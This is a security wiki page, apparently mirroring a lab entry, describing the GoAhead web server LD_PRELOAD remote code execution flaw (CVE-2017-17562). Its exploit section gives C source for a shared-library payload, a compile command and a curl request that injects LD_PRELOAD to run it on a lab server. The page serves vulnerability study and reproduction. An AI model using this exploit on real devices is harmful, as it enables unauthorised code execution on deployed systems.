<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/GoAhead/CVE-2017-17562/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>GoAhead Web Server Environment Variables Injection and LD_PRELOAD Remote Code Execution (CVE-2017-17562) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "GoAhead Web Server Environment Variables Injection and LD_PRELOAD Remote Code Execution (CVE-2017-17562)", url: "#_top", children: [
              {title: "Vulnerable environment", url: "#vulnerable-environment" },
              {title: "Exploit", url: "#exploit" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        GoAhead 远程命令执行漏洞（CVE-2017-17562）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Goahead%20LD_PRELOAD%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-42342/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Goahead%20LD_PRELOAD%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-42342/" class="btn btn-xs btn-link">
        Goahead LD_PRELOAD 远程命令执行漏洞 CVE-2021-42342
      </a>
    </div>
    
  </div>

    

    <h1 id="goahead-web-server-environment-variables-injection-and-ld_preload-remote-code-execution-cve-2017-17562">GoAhead Web Server Environment Variables Injection and <code>LD_PRELOAD</code> Remote Code Execution (CVE-2017-17562)<a class="headerlink" href="#goahead-web-server-environment-variables-injection-and-ld_preload-remote-code-execution-cve-2017-17562" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>Embedthis GoAhead is the world's most popular, tiny embedded web server, which is deployed in hundreds of millions of devices and is ideal for the smallest of embedded devices.</p>
<p>GoAhead before 3.6.5 allows remote code execution if CGI is enabled and a CGI program is dynamically linked. This is a result of initializing the environment of forked CGI scripts using untrusted HTTP request parameters in the cgiHandler function in <code>cgi.c</code>. When combined with the glibc dynamic linker, this behaviour can be abused for remote code execution using special parameter names such as <code>LD_PRELOAD</code>. An attacker can POST their shared object payload in the body of the request, and reference it using /proc/self/fd/0.</p>
<p>References:</p>
<ul>
<li><a href="https://www.elttam.com.au/blog/goahead/">https://www.elttam.com.au/blog/goahead/</a></li>
<li><a href="https://www.exploit-db.com/exploits/43360">https://www.exploit-db.com/exploits/43360</a></li>
<li><a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/goahead_ldpreload.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/goahead_ldpreload.rb</a></li>
</ul>
<h2 id="vulnerable-environment">Vulnerable environment<a class="headerlink" href="#vulnerable-environment" title="Permanent link">&para;</a></h2>
<p>Execute following commands to start a GoAhead 3.6.4:</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>Then, you can see the welcome page at <code>http://your-ip:8080</code>, CGI scripts is available at <code>http://your-ip:8080/cgi-bin/index</code>.</p>
<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
<p>First of all, compile this hijack code to a dynamic shared library:</p>
<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">before_main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">));</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">before_main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Hello: World!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">14</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
<blockquote>
<p>Please notice that, since GoAhead is a compact embedded webserver running on almost any possible IoT device, the format of dynamic shared library is always depending on the target server architecture. In the real world, compiling exploits is not as easy as this manual suggests, although Vulhub could show you a simplest example.</p>
</blockquote>
<p>Compile on a x86/64 environment:</p>
<div class="highlight"><pre><span></span><code>gcc -shared -fPIC ./payload.c -o payload.so
</code></pre></div>
<p>Use curl to trigger the attack:</p>
<div class="highlight"><pre><span></span><code>curl -X POST --data-binary @payload.so &quot;http://your-ip:8080/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0&quot; -i 
</code></pre></div>
<p>The response header <code>Hello: world!</code> is printed to indicate that the code has been executed:</p>
<p><img alt="" src="1.png" /></p>
<p>A reverse shell is got:</p>
<p><img alt="" src="2.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        GoAhead 远程命令执行漏洞（CVE-2017-17562）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Goahead%20LD_PRELOAD%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-42342/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Goahead%20LD_PRELOAD%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-42342/" class="btn btn-xs btn-link">
        Goahead LD_PRELOAD 远程命令执行漏洞 CVE-2021-42342
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>